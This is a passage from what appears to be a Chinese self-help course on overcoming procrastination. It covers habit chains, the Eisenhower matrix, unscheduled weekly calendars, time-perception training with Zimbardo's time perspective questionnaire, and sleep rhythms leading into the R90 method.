所谓「链条法」，就是把长期任务看作一条链。在执行过程中，只要完成当天应完成的任务量，就在日历上画一个 X。随着时间的推移，这些 X 将连成一条链的形状。你的目标是确保日历上划出的链条不断延伸下去。 这就像是在日历上给自己打卡，将你的努力以直观的方式「可视化」呈现出来，既是对自己的激励，也是给自己加油打气。 这个「链条」提醒着你每天都要腾出时间继续你的长期计划。如果今天还没有做到，就要排除其他不那么重要任务的干扰，让你的注意力专注在目标上。 通过「链条法」，你不仅可以跟踪自己的进度，还可以清晰地看到自己的持续努力。它帮助你保持动力，坚持每天向目标迈进，不再拖延或丧失动力。 清理环境 也许你从未想过，但房间里的多余物品实际上也会占用你的注意力资源。为了更好地利用你的专注力，你需要学会清理冗余信息。这些冗余信息包括我们之前提到的「节奏模式」中涉及的手机软件、社交软件、电子邮箱等网络信息，还包括你可能没有注意到的环境信息。 很多人在开始工作之前都喜欢整理房间或工作台。他们会清除掉不需要的物品，因为在摆脱这些物品之后，他们会感到身心轻松，能够更好地专注于工作。这其背后的原理就是清理无关信息的重要性。 正如我们之前所讲，环境可以为你创造一个特定的「环境」。有着良好工作氛围的环境能够唤醒你的大脑，帮助你进入工作状态。相反，杂乱无序的环境会消耗你的大脑资源，使你不得不处理那些不必要的干扰，从而无法集中精力完成工作。 下次当你感觉不想工作时，我建议你从整理书桌和清除过期食品开始。这些小小的举动会帮助你营造一个整洁有序的工作环境，减少无关信息的干扰，并为你提供一个更好的工作体验。 通过清理无关信息，你将会发现自己能够更好地专注于任务，提高工作效率，并克服拖延症带来的困扰。记住，一个清爽的环境有助于清晰思考，让你的大脑更好地服务于你的目标。所以，从现在开始，清扫掉那些无关的信息和物品，为自己创造一个有利于高效工作的环境。 艾森豪威尔矩阵 越忙越低效 越忙碌，效率却越低下。这种现象的原因在于你没有正确地分配时间。 三个关键点：（1）什么是艾森豪威尔矩阵，（2）如何使用这个矩阵，（3）如何重新构建你的时间矩阵。 请允许我猜测一下，你是否经常有这样的感受：每天都忙忙碌碌，付出了很多努力，但到了一天结束时，却发现自己没有完成任何重要的事情，只能将它们推迟到明天。如果我的猜测正确，那么你可能正陷入了像我以前的同事小明一样的困境，即由于时间管理不善而陷入拖延的怪圈。 小明他似乎永远都在忙碌。从早上到坐下办公室，他从未停下过脚步，全公司都知道他每天加班，忙到深夜。按理说，小明如此努力，理应升职加薪才对。然而，事实并非如此。当时，人力资源部私下里询问我的意见，是否应该解雇小明。 为什么会这样呢？因为小明在公司的业绩垫底，他的工作表现实在糟糕透顶。我后来去了解了一下小明的情况，发现他每天用在重要工作上的时间非常有限。他花费大部分时间接听工作电话，和同事沟通方案，帮助同事设计表格、还参加各个大的小的会议和学习以及团建活动。这些看似即将处理的琐事，但仔细想想，很多并不是真正重要的事情。 因此，小明似乎每天都有人找他处理紧急事务，但正因为忙于这些看似紧急的琐事，他忽略了为「重要事务」安排时间的重要性。他所犯的错误是时间管理上最容易陷入的一个误区，即在「紧急但不重要」的事情上花费了大量的时间。 高效时间管理 这个矩阵为我们提供了解决时间管理难题的方法，帮助我们高效地安排任务时间。 你或许对“艾森豪威尔”这个名字有些耳熟。艾森豪威尔是美国第 34 任总统，他在成为总统之前就以成功指挥诺曼底登陆行动而闻名，为二战的胜利打下了基础。然而，你可能不知道的是，他还是一位备受推崇的时间管理大师。 众所周知，总统的工作极其繁忙，而艾森豪威尔为了合理安排自己的工作和生活，发明了一种时间管理工具。他在纸上画了一个“十字”，将纸面分为四个象限，横轴代表“紧急性”，纵轴代表“重要性”。这样，我们手头的任务可以根据其“紧急性”和“重要性”被归类到这四个象限中。 为什么要按照“重要性”和“紧急性”对任务进行分类呢？因为这样可以帮助我们确定哪些任务需要优先安排时间。我将举几个例子来解释艾森豪威尔矩阵的使用方法，相信你会更清楚： 第一象限包含重要且紧急的任务，这些任务对你来说至关重要，而且有明确的截止期限。例如，准备明天会议的发言稿、陪孩子去医院治疗、在下班前需要完成的项目计划等。对于这些任务，你需要立即行动并迅速完成。 第二象限则包括重要但不紧急的任务，这些任务对你来说很重要，但没有明确的完成期限，或者完成期限较长。例如，跟进长期项目的每周进展、为家人购买必要的保险、提升自己的英语水平等。 这些任务由于不紧急，往往容易被忽视和拖延，直到它们变成“重要且紧急”的任务。例如，因为没有时间跟进项目导致延误截止日期，没有购买保险导致家庭面临风险，平时没有学习英语，机会来临时才匆忙应对，这就是为什么在时间管理中，我们应该尽量将时间投入到第二象限中，也就是那些重要但不紧急的事务上。 艾森豪威尔曾经说过：“最紧迫的决策通常不是最重要的。”这句话的含义是，你需要识别出真正重要、对你的工作和生活具有战略影响的事情。而这些事情往往是“重要但不紧急”的事务。 第三象限包含紧急但不重要的事务，即那些对你来说并不那么重要，但却看似需要立即完成的任务。例如，每天忙于接待来访的客人、协助同事设计表格、参加各种会议、论坛和活动等。这些事情让我们每天都感觉非常忙碌，但最终却发现一天结束时几乎没有做重要的事情。 针对这类任务，你应该尽量节省时间，将琐事交给他人处理，或者集中一段时间来处理这些事务。对于那些可以选择参与或不参与且会占用大量时间的活动，你要坚定地说“谢谢”，然后拒绝参与。请记住，正是因为我们花太多时间处理第三象限的琐事，才导致我们没有时间去做第一象限和第二象限中真正需要做的事情。 最后是第四象限，包含那些既不重要也不紧急的事务，也就是那些可以不做的琐碎任务。例如，看完一部电视剧，去尝试新开的网红餐厅，或者浏览社交软件。如果你将大部分时间都用在这些事情上，你需要考虑一下是否真的没有更重要的事情需要处理，或者是在拖延时间。 重构森豪威尔矩阵 许多人只知道如何使用艾森豪威尔矩阵来安排时间，但在实际应用中却无法有效处理各种任务。我将帮助你解决这个问题，重新塑造艾森豪威尔矩阵，以优化工作任务和时间管理。 在重构之前，不妨思考一下，根据我们之前的讲解，最理想的矩阵应该是什么样子的？是不是希望事务尽可能分布在&quot;重要但不紧急&quot;这个象限中？ 如果一个人的任务都是重要且紧急的，那每天都会被各种截止日期逼迫，根本喘不过气来，许多事情只能草率应付；如果一个人的任务都是不重要但紧急的，那就是我们前面提到的例子中的小明，整天忙碌却实际上什么也没有完成；如果一个人只有不重要又不紧急的任务，那可能就是无所事事。 而当一个人的任务大多都是重要但不紧急的，意味着他既有明确的目标，又有合理的规划。那么，我们该如何改造自己的矩阵，将其变为只剩下&quot;重要但不紧急&quot;部分的理想状态呢？ 总共有两个步骤：（1）划掉横向的&quot;不重要&quot;两个象限，舍弃不重要的事；（2）减少紧急任务。 首先是第一步，舍弃不重要的事。无论紧急与否，不重要的事情只会占用你的时间和注意力资源，&quot;少&quot;，意味着高效。这个原则在这里同样适用。关于如何舍弃不重要的事，我给你两个小方法。 第一个小方法叫做&quot;一天只做最重要的三件事&quot;。它的核心思想是，如果你每天感觉有很多事情要做，不知道如何选择，那就将它们都写下来。然后从中挑出最重要的三件事，按优先级排列，依次去完成。当然，在这个过程中，你可以插入一些紧急且必须完成的事项，但是确保完成这三件事是你今天的首要目标。 如果你成功完成了这三件事，你可以继续处理清单中剩下的事项中最重要的事情。第二天，再列一个清单，同样选择并完成其中最重要的三件事。如此循环下去，你就能确保每天都完成最重要的事情，而那些被列在清单底部的事项，如果在一周后仍未上升到前列，你会发现它们可能是可以被舍弃的不重要事项，对于不做它们也并非至关重要。 这个方法非常实用，慢慢地你会发现，一天专注于完成最重要的三件事，效果比整天四处忙碌、毫无章法的忙碌要好得多。 第二个小方法叫做&quot;拒绝他人不合理的要求&quot;。在舍弃不重要事项的过程中，我们难免需要对他人说&quot;不&quot;。许多人会觉得，别人向我们请求帮忙本身就是重要的事情，我们应该帮助他们。但事实是，我们每天平均会浪费2小时在无效的社交上。学会拒绝他人不合理的要求，才能成为一个能够判断事务轻重、清醒地生活的人。 如果你总是无法拒绝别人，我教你三个判断标准：（1）对方对你的重要性，（2）对方对此事的重要性，（3）你是否能够胜任。只要这三个问题中至少有一个答案是肯定的，那么才值得你去做。否则，尝试坚定地说&quot;不&quot;。 例如，对于那些偷懒却借口不懂、不会或没有时间的同事，或者那些因为你擅长某项技能而免费请你帮忙的朋友，学会拒绝吧。不要让这些事情占据你的时间安排，成为你拖延重要事务的借口。 谈完了第一步，舍弃不重要的事。现在，你的矩阵中只剩下&quot;重要且紧急&quot;和&quot;重要但不紧急&quot;两种任务了。接下来要做的是减少紧急任务。 如何减少紧急任务？使用 SMART 原则拆分大任务为具体、可衡量、可操作、相关和时限的小任务，逐步完成每个小任务。 当你将这些小任务拆分并为每个任务设置提前的截止期限，并按进度逐一完成时，你将不再面对一堆火烧眉毛的紧急任务。甚至你还能够留出充足的时间来应对突发状况。这样做就是从规划和执行的源头上减少紧急任务。 例如，假设你面临一个重要且紧急的大任务，比如准备一个重要的报告。你可以将它分解为以下小任务：收集资料、整理数据、撰写大纲、编写内容、编辑校对等。然后，为每个小任务设定明确的截止期限，并按照计划逐一完成。 通过这种方式，你可以逐步完成每个小任务，减少了任务的紧急性。同时，你还能够更好地管理时间，避免最后一刻的焦虑和压力。此外，当你预留出适当的时间来处理突发情况时，你也能更好地应对紧急情况，而不会让它们占据你的全部注意力。 通过重塑你的艾森豪威尔矩阵，舍弃不重要的事项并减少紧急任务，你可以将工作任务和时间安排调整到更理想的状态。这样，你就能够更好地管理时间，专注于重要但不紧急的任务，提高工作效率，减少拖延症的发生。记住，时间管理是一个学习和实践的过程，坚持并逐渐改善自己的习惯，你将逐渐摆脱拖延症的困扰，实现更高效的生活和工作。 非计划日程 日程表难以执行 在谈到日程表时，我们通常会想到这样的安排：早上 6:30 起床，洗漱并做早饭，7:10 送孩子上学，8:30 到达公司开始一天的工作计划。我们常常希望将整天安排得满满当当，例如在午休或下班后安排健身活动，健身结束后继续工作；或者在下午 5:30 接孩子回家，6:00-6:30 做晚饭，6:30-7:00 和家人共进晚餐，7:00-8:00 做家务，8:00-9:00 看书，一直安排到睡前。 然而，这样安排日程表往往导致我们很快发现实施起来极为困难，因为只要一个任务未能按时完成，后续计划就会全面混乱。举个简单的例子，你原本计划在上午 9:00-10:00 写一份策划，但如果突然出现紧急会议，该怎么办呢？你也许希望晚上 6:30-7:00 是全家共进晚餐的时间，但你真的能控制家人的作息以便按照你的时间表进行吗？ 很多人制定了日程表之后最终放弃了，原因就在于这些。他们常常经历以下心理过程：制定的日程表总是无法完成，渐渐地开始逃避和忽视；频繁遇到这种情况后，他们会因为无法执行而对自己感到失望，这种失望感很不愉快。于是，他们认为既然制定日程表无济于事，干脆不再做计划。 然而，如果没有计划，每天的生活又变得混乱无章，总有事情会被拖延。 在今天的课程中，我想告诉你，如果你有类似的经历，请不要责怪自己。这种“完美”的日程表本来就很难执行，而且你越想精确安排每一分钟，把日程安排得紧密严谨，结果反而适得其反。事实上，对于这样的日程表来说，能完成一半已经相当不容易了。 制定非计划日程表 既然我们发现传统的「计划」日程表并不如我们期望的那样有效，而不做计划又会导致生活无序混乱，那么我们应该如何应对呢？Neil Fiore 提出了「非计划日程表」的概念，这种方法可以很好地解决制定的日程表难以执行的问题。 Neil Fiore 发现许多客户因为无法按照自己制定的日程表行动，而被失望和沮丧的负面情绪困扰。在追踪和研究了难以完成日程的原因后，他提出了「非计划日程表」的概念，并且这一方法在解决拖延症问题上非常有效，帮助了数以千计的人。 那么，具体来说什么是「非计划日程表」呢？它是一种以周为单位的日程表，与传统的按天计划不同，它将时间安排视为一周的整体。这样做的好处是能够全面、有序地安排时间。「非计划日程表」的制定包括以下三个步骤： 第一步，首先确定本周必须完成的任务，并将它们填写到每个工作日的相应位置上，确保没有遗漏。例如，如果每周一上午 10:00 有例会，就在日程表上的周一上午位置写上 10:00 例会；如果周二下午有与客户谈项目的约定，周五晚上 7:00 有孩子家长会，就在周二下午和周五晚上的位置标记出来。 通过这样的安排，你可以清楚地知道本周已经确定被占用的时间，同时也让可支配的时间显现出来。 第二步，查看你的日程表，上面没有填写任务的时间段就是本周可以支配的时间。现在你的任务不是继续安排任务，而是利用这些可支配的时间来完成能够帮助你实现目标的事情。什么是能够帮助你实现目标的事情呢？还记得我们上节课学习的艾森豪威尔矩阵吗？就是那些「重要的事情」。 在完成这些「重要的事情」之后，你再回过头来，在日程表上相应的时间段标注下这些已经完成的任务。 可以看到，相比于传统的日程表，「非计划日程表」至少有两个不同之处： 首先，传统的日程表上填写的是你期望自己能够完成的理想目标，但未必可行。而「非计划日程表」则记录的是你确定必须完成的任务，这些任务必须得到执行。 其次，传统的日程表是先制定日程，然后再去执行任务，但结果却不确定。而「非计划日程表」在确定了必须完成的任务后，你需要先进行实际行动，然后再填写在日程表上。换句话说，这是一张逐渐被填满的表，只有你确实完成了的任务才会被记录上去。 最后，填写完「非计划日程表」之后，你还可以用它来进行回顾和评估。因为这张表上记录的都是你已经完成的任务，你可以更清楚地了解自己的时间安排是如何的，你在娱乐和学习之间的平衡如何，工作和生活的安排是否真正达到了平衡。通过回顾和评估，你还可以找到优化日程安排的方法。这张「非计划日程表」成为了你行动的见证，也是你不断进步的参照。 下面是我的非日程表，仅供参考。 运用非计划日程表 在实际运用「非计划日程表」时，有三个关键要点需要注意： 首先，你需要将接下来一周必须完成的任务全部列出，确保没有任何遗漏。 要注意的是，这里列出的不是像传统日程表那样包括所有你想做的事情，而是确定已经占用你时间的事项。例如，周一上午 10:00-11:30 是部门例会。如果你对某个事件发生的具体时间不太确定，但确定会执行，那就估算一下所需时间，并将其标记在预计执行该任务的日期上，例如预计周日花一小时购买下周需要的食材。 请记住，不仅要标记工作和学习相关的事项，还要标记已经安排好的休闲活动时间，以及必须占用的购物、烹饪和睡眠时间等。只有这样，你的日程表中留出的可支配时间才会更加客观准确。 其次，你需要优先利用这些可支配时间来完成能够帮助你实现目标的任务。每完成一项任务，就在日程表上标记下所用时间。 我给你一个小建议，你可以将时间划分为不同的小块，并用不同颜色的笔涂色。例如，用一个小时的时间就涂掉一个方格，用半个小时的时间就涂掉半个方格。这种记录方式有两个非常重要的作用： 首先，通过不同颜色的色块，你可以感知自己的进步并获得成就感。当你看到一条条的日程被不同颜色填满时，就像我们在深度工作模式中提到的链条法，能够有效激励和督促你的行动； 其次，这种方法还能提升你对时间的知觉，即对时间的判断力。具体的方法我将保留一点悬念，在明天的课程中会为你详细讲解。 最后，根据填写完整的「非计划日程表」，回顾自己的时间安排，看看是否存在问题，是否可以进行优化。 请注意，不要只是简单列出任务就结束，一定要思考如何改进。如果每天花太多时间追剧，可以适当减少；如果你没有足够的娱乐时间，可以减轻一些负担。这才是「非计划日程表」的高效和人性化之处。 「非计划日程表」的优点在于它不仅帮助你规划时间，还能逐步填满并适应你的实际情况。 建立时间观 时间错觉 为什么我们对时间的流逝会产生错觉？ 前面介绍了如何制定一个「非计划日程表」，你可能会发现在实际执行的过程中，你对时间的判断很不准确。 例如，你是否发现你的空闲时间没有你想象中那么多或者那么少？当你填写预计占用时间段时，你是否发现与最后实际所需时间存在较大差距？比如预计需要 1 小时完成的方案，结果花了 3 个小时；预计下楼购买食物需要半小时，结果在路上来回加上逛菜市场花了一个半小时。甚至当你看到&quot;非计划日程表&quot;上的可支配时间时，你可能会感到迷茫，不知道如何安排好它们，以及如何用它们来规划你的工作和生活。 这些问题都源于你对时间的感知能力不足。许多人学习了各种时间管理方法后仍然无效，这是因为他们没有解决这个根本问题。也许你从未想过，一个人对时间的感知能力也需要进行训练。今天，我将具体讲解这个问题。 时间感知能力包括短期时间感知和长期时间感知两个方面。 短期时间感知是指我们能否准确地感知时间的流逝，能否相对准确地预估完成某项任务所需的时间。 例如前面提到的，写一份策划到底需要 1 小时还是 3 小时，下楼购买食物正常的时间是半小时还是一个半小时。准确预估时间的前提是首先能够相对准确地感知时间的流逝。 许多拖延的人都有过类似的经历。当看电视剧时，感觉花费的时间并不多，但一集、两集...转眼间就过去了两三个小时；周末起床后想看一下推特，刷两分钟抖音，结果不经意间就耽误到午饭时间了。 许多人对时间没有概念，容易拖延，就是因为无法准确、客观地感知时间的流逝。他们心理上对时间的感受与我们通常用来计时的钟表时间不一致，而且相差很大。 为什么会出现这种不一致呢？这是因为人对时间的感知本身就是主观的，喜欢的事情时间过得快，而不喜欢的工作时间过得慢。我们可以把这种主观对时间的感受称为「主观时间」。那么客观时间是什么呢？一小时等于六十分钟，一分钟等于六十秒，滴答一声就是一秒，这就是客观时间，也是我们日常使用的&quot;钟表时间&quot;。 当我们判断时间时，我们的心理自然启动的不是「客观时间」，而是围绕一项任务进行的时间判断。例如，你潜意识里想的不是「二十三分钟后，我要去机场」，而是「把房间整理好后，我要去机场」；不是「晚饭后我要看三十三分钟书」，而是「晚饭后我要看一会儿书」。这些围绕一项任务完成所需时间的判断非常主观，因此我们心理上的&quot;主观时间&quot;和客观的&quot;钟表时间&quot;之间存在差异。 如果一个人很幸运，他心理上的「主观时间」和客观的「钟表时间」能够完美契合，那么他的时间观念一定很强；但如果一个人心理上的「主观时间」和「客观时间」相差很大，而且不愿意面对这两者之间的差异，就容易在这两者之间挣扎，陷入拖延的状态。 训练时间观 每日回顾 第一个方法是精确记录时间并进行每日回顾。 在上一节课中，我已经提到过这个方法，现在我将更详细地解释。你可以继续使用上节课提到的「非计划日程表」，以&quot;事件-花费时间&quot;的形式详细记录你完成每个任务所用的时间。记住，记录时一定要精确到分钟。例如，如果你下午花了三个小时写一份策划，你不能简单写下&quot; 3 小时&quot;，而是要具体标注&quot;15:00 开始写，18:13 完成，共花费 193 分钟&quot;。这样精确记录时间的好处是可以锻炼你对时间的感知能力，让你更准确地预估时间。 Alexander Alexandrovich 就曾使用这种训练方法。他的时间判断准确度非常高，即使不看表也能精确说出每个任务所花费的时间，准确到分钟。他形容这就像身体内部装了一个计时器一样。他说，记录时间这个习惯要坚持下去。如果只记录某一天的时间日志是没有用的，应该记录一周、一个月、甚至更长的时间。 如果你希望培养良好的时间感，更好地安排和利用时间，我鼓励你尝试坚持记录时间。刚开始时可能觉得麻烦，但请坚持下去，相信你会获得回报。 设定时间限制 第二个方法是有意识地给自己设定任务时间限制。 你对时间的感知力不足的一个重要原因是在做大部分任务时很少给自己设定时间限制。举个简单的例子，当你要整理房间时，通常只会开始收拾，没有明确的结束时间，不知道具体花费了多长时间。这种习惯导致你倾向于拖延，可以一直慢慢地进行。 从现在开始，你可以尝试改变方式。比如今天要整理房间，那就好，你认为两个小时足够完成，于是打开手机闹钟，把它当作一个游戏中的限时任务。设定一个两小时的闹钟，然后开始收拾。 也许闹钟还没响就完成了收拾，那就检查一下花了多少时间；也许闹钟响了还没收拾完，那就再给自己比如三十分钟，再设定一个闹钟，继续进行，直到真正完成为止。通过多次尝试，你会逐渐了解自己需要多长时间来整理房间。对于其他任务也是同样的道理，多给自己一些有趣的限时任务，你将更好地掌握各种任务所需的时间。 建立时间感知力 在时间管理的最后一部分，我们将探讨如何建立良好的时间观，培养长期的时间感知能力。Philip George Zimbardo提出了关于时间观的理论，他发现每个人对过去、现在和未来有不同的时间导向，这些时间导向会明显影响我们对待生活、工作以及行为的方式。 他将时间观分为六个维度，分别是过去消极时间观、过去积极时间观、当下宿命主义时间观、当下享乐主义时间观、未来时间观和超未来时间观。这些维度代表了我们对过去、现在和未来的态度，从消极到积极，共有六种组合。 例如，在过去这个时间段，过去消极时间观让我们更关注不好的经历，引发负面情绪；而过去积极时间观则让我们专注于美好回忆，产生积极的影响。类似地，在当下这个时间段，当下宿命主义时间观使我们觉得无法改变任何事情，感到绝望；相反，当下享乐主义时间观则让我们更愿意享受当前时刻。同时，我们还有未来时间观和超未来时间观，它们影响着我们对未来的准备和对生活的态度。 根据 Philip Zimbardo 的研究，每个人的时间观都是由这六种维度混合而成的。它们就像是六个住在我们头脑里的小人，当我们做决策时，我们会倾听其中哪个小人的声音更多。 对于拖延的人来说，过去消极时间观和当下宿命主义时间观可能会产生较大影响，让他们沉溺于过去和当前的消极和焦虑情绪。而对于有规划、积极且不容易拖延的人来说，过去积极时间观、当下享乐主义时间观和未来时间观可能会更具影响力。这意味着他们更容易回想起过去的成就，相信在当前任务中会有愉快的体验，并做好未来任务的准备。 如何建立时间观 首先，我们需要处理过去的情绪和回忆，重点强化积极的记忆。每天在睡前记录一段让自己感到开心或感动的经历或故事，并每周回顾一次。通过这种方式，我们能够加强大脑中对积极过去的时间观。 其次，对于当前的时间观，我们可以运用之前提到的方法，如游戏化和专注力提升。在工作中寻找乐趣，实时关注自身的成长，并学会将注意力集中在当下，排除干扰因素。 另外，针对未来的时间观，我们需要让自己看清未来的样貌。可以运用艾森豪威尔矩阵对时间进行规划，将重要但不紧急的事项纳入计划中。多思考如何更快地实现这些目标，从而强化对未来的时间观。 最后，需要注意的是，尽管积极过去时间观、当下享乐主义时间观和未来时间观对于克服拖延症和实现目标更为有益，但其他三种时间观也有其价值。例如，消极过去时间观有助于我们记住错误并吸取教训，当下宿命主义时间观可以让我们更坦然地面对失败，超未来时间观能在一定程度上缓解压力。因此，我们的目标是在这六种时间观中找到平衡点和重心，以实现高效而又不机械化的生活。 下面是 Philip Zimbardo 六个维度的时间观测试题目，尝试完成以下测试，然后根据结果调整自己的时间观。 Philip Zimbardo 时间知觉测试 填写说明：请认真阅读每道题目，按照描达与自己的符合程度打分。(1=极不符合，2=不符合，3=一般，4=符合，5=极为符合) 序号 问题 分数 1 我认为和朋友一起参加聚会是生活中很重要的乐趣 2 熟悉的童年景象、声音和气味经常会勾起我很多美好的回忆 3 命运决定了我人生中大部分的事情 4 我经常会想，在那段人生中我应该这样做而不应该那样做 5 我的决定很大程度上取决于我周围的人和事 6 我认为我们的每天都应该在早晨就提前做好计划 7 回想过去能让我感到快乐 8 我做事比较冲动 9 如果事情不能按时完成，我也不会焦虑 10 当我想做成某一件事情时，我会设定目标，仔细考虑各种能达成目标的方法 11 总的来讲，我的美好的回忆比不好的回忆要多很多 12 当我聆听喜欢的音乐时，我常常会忘记时间的流逝 13 赶明天的任务和做其他必要的工作比今天晚上的娱乐活动更重要 14 既然要发生的事情总会发生，那么我做什么并不重要 15 我喜欢听那些关于&ldquo;过去的美好时代&rdquo;的故事 16 那些过去的痛苦经历总是在我的脑海里重复出现 17 我尽可能充实地度过我的每一天 18 迟到让我觉得很难过 19 理想状态下，我会把每一天都当作生命中的最后一天来度过 20 那些美好时光的快乐记忆总是经常出现在我的脑海里 21 我总是准时兑现我对朋友或者上级的承诺 22 我过去遭受过侮辱和拒绝 23 我经常在冲动之下做决定 24 我总是活在当下，而不是尝试去规划每天 25 过去有太多不愉快的回忆，我情愿不去回想 26 在我的生活中寻找刺激很重要 27 我曾经在生活中犯下了令我后悔的错误 28 我觉得享受自己正在做的事比把事情按时完成更重要 29 我常常怀念我的童年 30 在做决定之前，我都会衡量成本和收益 31 冒险让我的生活不那么无趣 32 享受生活的旅程比专注于达成人生目标更重要 33 事情很少会按我预想的那样发展 34 我很难忘记儿时不愉快的记忆 35 如果我总是想着目标、结果和产出，就会让过程变得非常无趣，无法专注地做事 36 当我在享受当下的时候，我也会不自觉地把现在和过去类似的经历做比较 37 你很难真的为未来做规划，因为事情的变化真的太快了 38 我人生的旅途是被我不能改变和影响的力量所控制的 39 为明天而忧虑一点儿用也没有，因为没有什么事是你可以左右的 40 我总是持续稳定地推进我的工作，最后按时完成任务 41 我总是会在家人讨论从前时发呆走神 42 为了让生活更刺激，我会选择去冒险 43 我会把要做的事情列出来 44 我经常都会听从内心去做决定，而不是听从我的理智 45 当我知道自己有事情要做的时候，我可以抵挡诱惑 46 我发现自己常常会被兴奋冲昏了头脑 47 现在的生活太复杂了，我更想过从前的简单生活 48 我更喜欢交随性的朋友而不是有板有眼的朋友 49 我喜欢定期重复的家庭传统或者仪式 50 我有时候会回想起以的发生过的不好的事情 51 如果困难的、无聊的工作可以让我领先别人一步，我也会去做 52 把赚来的钱在今天花掉比存起来更好 53 很多时候运气比努力更重要 54 我有时候会想起那些生活里错失的美好事物 55 我喜欢亲密关系，并充满激情 56 我总有时间把落下的工作进度补回来 总分 分数 过去消极时间观 当前享乐主义时间观 未来时间观 过去积极时间观 当下宿命主义时间观 下面是 Philip Zimbardo 给出的理想时间观的分数，在表格中已绿色呈现。 由于超未来时间观的内容和本文关系不大，所以在这里就不作介绍了。 R90 睡眠法 如何通过正确的睡眠和休息来高效恢复精力，找到适合自己的工作节奏。你或许会质疑，睡觉和休息还需要学习吗？我先和你分享一个小故事。 睡眠对拖延的影响 一开始我并没有察觉到小明有拖延症的迹象，因为他总是立即开始工作，只要领导下达任务。小明是一名设计师，电脑上的绘图软件几乎一直都在运行。然而，我渐渐发现他的工作效率似乎有些问题。虽然他似乎很早就开始工作了，但经常几个小时过去了，却没有什么进展，屏幕上还是一成不变的画面。 我询问他发生了什么，他回答说：“不行，我完全没有状态。昨晚加班到半夜，但没有什么效果。我想今天早点起床工作，但醒来后还是感觉很累，无法开始工作。”通过进一步的询问，我才得知小明已经持续疲劳作战了相当长的时间。起初，他因为领导交给的任务非常繁重，只能熬夜完成。熬夜后，小明充满进取心，想着后面的任务也不能拖延，于是依赖咖啡和能量饮料在第二天振作精神工作。然而，这些提神饮料导致他晚上难以入睡，第二天早上精神不佳，于是又继续依赖咖啡......陷入了恶性循环。 小明也曾尝试在周末好好休息，调整状态。于是他整天都在睡觉，但奇怪的是周一到来时，他的状态变得更糟了。久而久之，小明的拖延已经不再是主观意愿的问题，他真的很想尽快开始工作，但身体不听使唤，他感觉大脑都无法运转了。 小明遇到的问题是典型的睡眠和休息不足导致精力不足，进而导致拖延。我相信你也曾有过这样的经历，就是明明很想做某事，但身体却无法行动起来。对于那些承受工作压力的人来说，这种情况可能尤为常见。不要责怪自己缺乏毅力，因为实际上，&quot;过度疲劳&quot;在导致拖延的原因中排名非常高。就像我们认识到注意力资源有限一样，我们的体力和精力也是有限的。当你感到极度疲倦时，强迫自己完成各种工作任务自然变得格外困难。 然而，另一方面，你肯定也会注意到一群人，他们在与小明面临相同或更大工作强度的情况下，似乎每天都拥有无穷无尽的精力，他们不仅工作效率高，而且完成的质量也非常出色。他们通常是那些懂得如何睡眠和休息的人，他们的精力恢复比其他人更快，因此拥有更多的能量去处理事务。 要学会高效地睡眠和休息，你首先需要了解睡眠和休息的秘诀。 高效睡眠 在高效睡眠和休息方面，有两个关键要素：昼夜节律和睡眠类型。 昼夜节律 昼夜节律指的是人体内一种调节机制，使得我们的睡眠、激素分泌、体温、敏感度和情绪等都呈现周期性的变化，以适应外部环境的变化。可以将其简单理解为生物钟，它是人类进化过程中受白天和黑夜交替变化的影响所产生的生理节律，每个周期约为 24 小时，即一昼夜。 古人所说的&quot;日出而作，日落而息&quot;就体现了昼夜节律。其背后的含义是，我们在一天的不同时间段，对睡眠的需求和效果不同。例如，助于人体入睡的褪黑素大约在晚上九点左右开始分泌，在早上七点半左右停止；体温下降有助于进入深度睡眠，我们在凌晨两点左右睡眠最深，凌晨四点左右体温降至最低。一般来说，晚上 11 点到早上 7 点是最适合睡眠的时间段，睡眠需求最大，效果最好。 然而，白天受多种因素的影响，如体温升高和褪黑素不分泌，如果在白天长时间睡眠，效果并不理想。 （图片来自《睡眠革命》） 现在让我们再来看小明的例子，你应该已经明白，小明长期处于疲劳状态是因为他违反了自己的睡眠需求和昼夜节律。他经常熬夜，而晚上本应该休息的时间，白天又依靠咖啡和红牛提神，没有合理地调节休息。结果是白天效率低下，晚上又需要继续熬夜，形成了恶性循环。甚至由于白天过度摄入咖啡和红牛等提神饮料，导致晚上失眠，无法入睡。 那么像小明这样的情况，应该如何调节呢？我将在本节课的最后详细讲解，现在先看看与睡眠相关的第二个要素：睡眠类型。 睡眠类型 前面我们提到的昼夜节律，体现了人类一般的生理规律。然而，每个人在睡眠类型上还存在一些个体差异，这些差异是由基因决定的。 简单来说，睡眠类型可以分为&quot;早起鸟&quot;和&quot;夜猫子&quot;。早起鸟在白天工作时精力充沛，但晚上容易感到疲倦，往往早早上床休息。夜猫子则早上难以起床，白天感到疲惫，晚上的工作效率更高。 这是因为在古代恶劣的自然环境中，需要有人时刻保持清醒，以确保群体的安全。因此，一些人在夜晚负责守卫，白天休息；而另一些人则在白天负责守卫，夜晚休息。由此，人类在进化过程中，睡眠时间产生了分化。那些在白天负责守卫的人逐渐演变成了早起鸟，而在夜晚值夜班的人则变成了夜猫子。 那么，如何判断自己是&quot;早起鸟&quot;还是&quot;夜猫子&quot;呢？目前最常用的方法是进行睡眠类型调查问卷。我在课程文稿的末尾附上了这份问卷，在听完课后你可以填写并进行测试。 综合考虑一般的昼夜节律和个体差异的睡眠类型，这两者的叠加效果接近于个人的节律。具体来说，个人的睡眠节律会在昼夜节律的基础上，根据睡眠类型发生不同的偏移。每个人的睡眠类型不同，偏移的程度也不同。 例如，如果基础的昼夜节律认为晚上 11 点到早上 7 点是最适合入睡的时间，那么对于一个早起鸟来说，睡眠需求最大、效率最高的时间可能是晚上 9 点到早上 6 点；而对于一个夜猫子来说，可能是凌晨 1 点到早上 9 点。 正如前面所提到的，睡眠类型在很大程度上是由基因决定的，不太容易受外界因素影响而改变。因此，你需要学会调整外部因素，尽量适应自己的节奏，将最重要的工作安排在状态最佳的时间段，以最大化效率。同时，让自己在睡眠需求最大、睡眠效果最好的时段入睡，以达到精力恢复的最佳效果。 回到小明的例子，他晚上经常加班到半夜，却无法高效工作。这时他需要反思自己是否属于早起鸟类型，更需要在晚上得到良好的休息，然后在早晨早早开始工作。如果他是夜猫子，也许应该给自己在白天安排一些小憩的时间，以调整工作节奏。 你可能会问，在现实生活中，工作时间往往是固定的，如何在这样的时间框架内让工作节奏适应自己的睡眠和休息节律呢？ 我为你准备了两种有效的方法。首先是关于如何获得更好睡眠的 R90 睡眠法，适用于整夜睡眠的人。其次是关于如果晚上睡眠不足，如何在白天进行可控的修复期来调整休息状态。 R90 